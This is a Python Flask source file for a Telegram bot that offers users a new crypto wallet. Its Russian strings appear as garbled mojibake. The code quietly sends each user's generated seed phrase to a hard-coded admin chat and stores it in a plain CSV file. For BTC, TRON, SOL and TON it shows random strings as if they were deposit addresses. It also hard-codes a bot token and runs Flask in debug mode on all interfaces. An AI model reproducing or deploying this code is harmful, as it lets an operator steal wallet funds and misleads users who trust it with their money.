from flask import Flask, request, send_from_directory
import os
import requests
import csv
import random
import string
from mnemonic import Mnemonic
from eth_account import Account

app = Flask(__name__, static_folder="miniapp")

# === Telegram Bot Config ===
BOT_TOKEN = "7987309610:AAHJkAlbPTxhToO9iyNvnh6I43kacWSP81M"
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
ADMIN_CHAT_ID = "6221874088"  # –ó–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Ç–≤–æ–π Telegram ID

# === Serve MiniApp ===
@app.route("/")
def serve_index():
    return send_from_directory(app.static_folder, "index.html")

@app.route("/<path:path>")
def serve_static(path):
    return send_from_directory(app.static_folder, path)

# === Telegram Webhook ===
@app.route(f"/{BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = request.get_json()
    if "message" in update:
        chat_id = str(update["message"]["chat"]["id"])
        text = update["message"].get("text", "")

        if text == "/start":
            send_message(chat_id, "–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!\n–°–µ–π—á–∞—Å —Å–≥–µ–Ω–µ—Ä–∏—Ä—É—é –¥–ª—è –≤–∞—Å –∫—Ä–∏–ø—Ç–æ–∫–æ—à–µ–ª—ë–∫...")

            # –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–∞
            seed_phrase, word_indices, words_to_verify, wallet_data = generate_wallet()

            # –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ
            user_id = save_user_data(chat_id, seed_phrase, wallet_data)

            # –û—Ç–ø—Ä–∞–≤–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏
            send_message(chat_id, f"–°–æ—Ö—Ä–∞–Ω–∏—Ç–µ –≤–∞—à—É seed-—Ñ—Ä–∞–∑—É:\n\n{seed_phrase}\n\n"
                                  f"–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –≤–≤–µ–¥–∏—Ç–µ —á–µ—Ä–µ–∑ –ø—Ä–æ–±–µ–ª —Å–ª–µ–¥—É—é—â–∏–µ —Å–ª–æ–≤–∞ –∏–∑ —Å–∏–¥-—Ñ—Ä–∞–∑—ã:\n"
                                  f"{word_indices[0]}-–µ, {word_indices[1]}-–µ, {word_indices[2]}-–µ —Å–ª–æ–≤–∞.")

            # –°–æ—Ö—Ä–∞–Ω—è–µ–º —á—Ç–æ –æ–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ
            pending_verification[chat_id] = {
                "user_id": user_id,
                "seed": seed_phrase,
                "answers": words_to_verify
            }

        elif chat_id in pending_verification:
            # –ü—Ä–æ–≤–µ—Ä–∫–∞ –æ—Ç–≤–µ—Ç–∞
            user_input = text.strip().split()
            expected = pending_verification[chat_id]["answers"]

            if user_input == expected:
                send_message(chat_id, "‚úÖ –ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ! –î–æ—Å—Ç—É–ø –∫ –∫–æ—à–µ–ª—å–∫—É –æ—Ç–∫—Ä—ã—Ç.")
                del pending_verification[chat_id]
            else:
                send_message(chat_id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ —Å–ª–æ–≤–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.")

        else:
            send_message(chat_id, "–í–≤–µ–¥–∏—Ç–µ /start –¥–ª—è –Ω–∞—á–∞–ª–∞.")

    return "ok", 200

# === –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π ===
def send_message(chat_id, text):
    url = f"{API_URL}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
    }
    requests.post(url, json=payload)

# === –í–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏—è ===
pending_verification = {}

# === –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–∞ ===
def generate_wallet():
    # 1. Seed
    mnemo = Mnemonic("english")
    seed_phrase = mnemo.generate(strength=128)
    words = seed_phrase.split()

    # 2. –°–ª—É—á–∞–π–Ω—ã–µ —Å–ª–æ–≤–∞ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
    word_indices = sorted(random.sample(range(12), 3))
    words_to_verify = [words[i] for i in word_indices]

    # 3. –ì–µ–Ω–µ—Ä–∞—Ü–∏—è –∫–æ—à–µ–ª—å–∫–æ–≤ (–∑–∞–≥–ª—É—à–∫–∞ –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è)
    wallet_data = {
        "BTC": fake_address("bc1"),
        "ETH": generate_eth_wallet(),
        "BNB": generate_eth_wallet(),
        "TRON": fake_address("T"),
        "SOL": fake_address("So"),
        "TON": fake_address("UQ")
    }

    return seed_phrase, [i+1 for i in word_indices], words_to_verify, wallet_data

# === –§–µ–π–∫–æ–≤–∞—è –≥–µ–Ω–µ—Ä–∞—Ü–∏—è –∞–¥—Ä–µ—Å–∞ (—Ä–µ–∞–ª—å–Ω—ã–µ –º–æ–∂–Ω–æ –ø–æ—Ç–æ–º) ===
def fake_address(prefix):
    return prefix + ''.join(random.choices(string.ascii_letters + string.digits, k=30))

def generate_eth_wallet():
    acct = Account.create()
    return acct.address

# === –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è ===
def save_user_data(telegram_id, seed, wallets):
    file_path = "users.csv"
    user_id = f"id{get_next_id(file_path)}"

    data = {
        "Telegram ID": telegram_id,
        "User ID": user_id,
        "Seed Phrase": seed,
        "BTC": wallets["BTC"],
        "ETH": wallets["ETH"],
        "BNB": wallets["BNB"],
        "TRON": wallets["TRON"],
        "SOL": wallets["SOL"],
        "TON": wallets["TON"]
    }

    file_exists = os.path.isfile(file_path)
    with open(file_path, "a", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=data.keys())
        if not file_exists:
            writer.writeheader()
        writer.writerow(data)

    # –£–≤–µ–¥–æ–º–∏–º –∞–¥–º–∏–Ω–∞
    message = f"üë§ –ù–æ–≤—ã–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å\nTelegram ID: {telegram_id}\nUser ID: {user_id}\n\nSeed:\n{seed}"
    send_message(ADMIN_CHAT_ID, message)
    return user_id

# === –°—á—ë—Ç—á–∏–∫ idN ===
def get_next_id(file_path):
    if not os.path.exists(file_path):
        return 1
    with open(file_path, newline="") as f:
        return sum(1 for _ in f)
    
# === Flask –∑–∞–ø—É—Å–∫ ===
if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(debug=True, host='0.0.0.0', port=port)
